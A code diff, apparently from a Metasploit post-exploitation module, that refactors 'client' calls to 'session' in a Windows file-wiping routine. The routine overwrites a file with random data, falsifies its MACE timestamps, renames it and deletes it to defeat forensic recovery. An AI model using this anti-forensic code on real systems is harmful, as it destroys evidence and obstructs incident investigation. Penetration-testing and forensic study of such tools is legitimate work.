@@ -57,8 +57,8 @@ class Metasploit3 < Msf::Post
 
   #Function to calculate the size of the cluster
   def size_cluster()
-    drive =  expand_path("%SystemDrive%")
-    r = client.railgun.kernel32.GetDiskFreeSpaceA(drive,4,4,4,4)
+    drive =  session.sys.config.getenv('SystemDrive')
+    r = session.railgun.kernel32.GetDiskFreeSpaceA(drive,4,4,4,4)
     cluster = r["lpBytesPerSector"] * r["lpSectorsPerCluster"]
     print_status("Cluster Size: #{cluster}")
 
@@ -68,7 +68,7 @@ class Metasploit3 < Msf::Post
 
   #Function to calculate the real file size on disk (file size + slack space)
   def size_on_disk(file)
-    size_file = client.fs.file.stat(file).size;
+    size_file = session.fs.file.stat(file).size;
     print_status("Size of the file: #{size_file}")
 
     if (size_file<800)
@@ -94,13 +94,13 @@ class Metasploit3 < Msf::Post
     rsec=  Rex::Text.rand_text_numeric(7,bad='012')
     date = Time.now - rsec.to_i
     print_status("Changing MACE attributes")
-    client.priv.fs.set_file_mace(file, date,date,date,date)
+    session.priv.fs.set_file_mace(file, date,date,date,date)
   end
 
   #Function to overwrite the file
   def file_overwrite(file,type,n)
     #FILE_FLAG_WRITE_THROUGH: Write operations will go directly to disk
-    r = client.railgun.kernel32.CreateFileA(file, "GENERIC_WRITE", "FILE_SHARE_READ|FILE_SHARE_WRITE", nil, "OPEN_EXISTING", "FILE_FLAG_WRITE_THROUGH", 0)
+    r = session.railgun.kernel32.CreateFileA(file, "GENERIC_WRITE", "FILE_SHARE_READ|FILE_SHARE_WRITE", nil, "OPEN_EXISTING", "FILE_FLAG_WRITE_THROUGH", 0)
     handle=r['return']
     real_size=size_on_disk(file)
 
@@ -118,10 +118,10 @@ class Metasploit3 < Msf::Post
       end
 
       #http://msdn.microsoft.com/en-us/library/windows/desktop/aa365541(v=vs.85).aspx
-      client.railgun.kernel32.SetFilePointer(handle,0,nil,"FILE_BEGIN")
+      session.railgun.kernel32.SetFilePointer(handle,0,nil,"FILE_BEGIN")
 
       #http://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx
-      w=client.railgun.kernel32.WriteFile(handle,random,real_size,4,nil)
+      w=session.railgun.kernel32.WriteFile(handle,random,real_size,4,nil)
 
       if w['return']==false
         print_error("The was an error writing to disk, check permissions")
@@ -131,7 +131,7 @@ class Metasploit3 < Msf::Post
       print_status("#{w['lpNumberOfBytesWritten']} bytes overwritten")
     end
 
-    client.railgun.kernel32.CloseHandle(handle)
+    session.railgun.kernel32.CloseHandle(handle)
     change_mace(file)
 
     #Generate a long random file name before delete it
@@ -139,7 +139,7 @@ class Metasploit3 < Msf::Post
     print_status("Changing file name")
 
     #http://msdn.microsoft.com/en-us/library/windows/desktop/aa365239(v=vs.85).aspx
-    client.railgun.kernel32.MoveFileA(file,newname)
+    session.railgun.kernel32.MoveFileA(file,newname)
 
     file_rm(newname)
     print_good("File erased!")
@@ -148,7 +148,7 @@ class Metasploit3 < Msf::Post
   #Check if the file is encrypted or compressed
   def comp_encr(file)
     #http://msdn.microsoft.com/en-us/library/windows/desktop/aa364944(v=vs.85).aspx
-    handle=client.railgun.kernel32.GetFileAttributesA(file)
+    handle=session.railgun.kernel32.GetFileAttributesA(file)
     type= handle['return']
 
     #FILE_ATTRIBUTE_COMPRESSED=0x800
